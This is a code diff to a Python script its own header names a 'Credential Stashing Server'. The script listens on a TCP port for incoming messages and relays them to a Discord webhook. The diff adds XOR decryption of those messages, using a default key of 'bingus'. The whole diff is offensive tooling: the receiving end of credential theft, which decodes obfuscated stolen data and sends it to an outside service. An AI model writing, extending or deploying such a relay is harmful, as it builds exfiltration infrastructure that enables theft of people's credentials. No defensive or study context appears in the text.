@@ -1,4 +1,5 @@
 ### Simple Python Credential Stashing Server ###
+from errno import ENXIO
 import socket
 import base64
 import threading
@@ -9,7 +10,23 @@ from dotenv import load_dotenv
 load_dotenv()
 
 url=os.getenv("WEBHOOK")
+key=os.getenv("XOR_KEY", "bingus")
 port = 8000
+
+# From GeeksForGeeks <3
+def xor_decrypt(inpString):
+ 
+    # calculate length of input string
+    length = len(inpString);
+ 
+    # perform XOR operation of key
+    # with every character in string
+    key_length = len(key)
+
+    for i in range(length):
+        i_key = i % key_length
+        inpString = (inpString[:i] + chr(ord(inpString[i]) ^ ord(key[i_key])) + inpString[i + 1:]);
+    return inpString;
 
 
 def fwd_discord(msg):
@@ -43,6 +60,10 @@ def handle(client_sock, addr):
     # Read the message
     msg_from_client = client_sock.recv(1024)
     msg = msg_from_client.decode()
+
+    # Decrypt the Message
+    msg = xor_decrypt(msg)
+    
     # Send to Discord
     fwd_discord(msg)
     return()
@@ -57,7 +78,7 @@ def main():
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_sock.bind(("", port))
     server_sock.listen()
-    print("Server Is Listening")
+    print(f"Server Is Listening\n    Key : {key}")
 
     # Listen for connections loop
     while True:
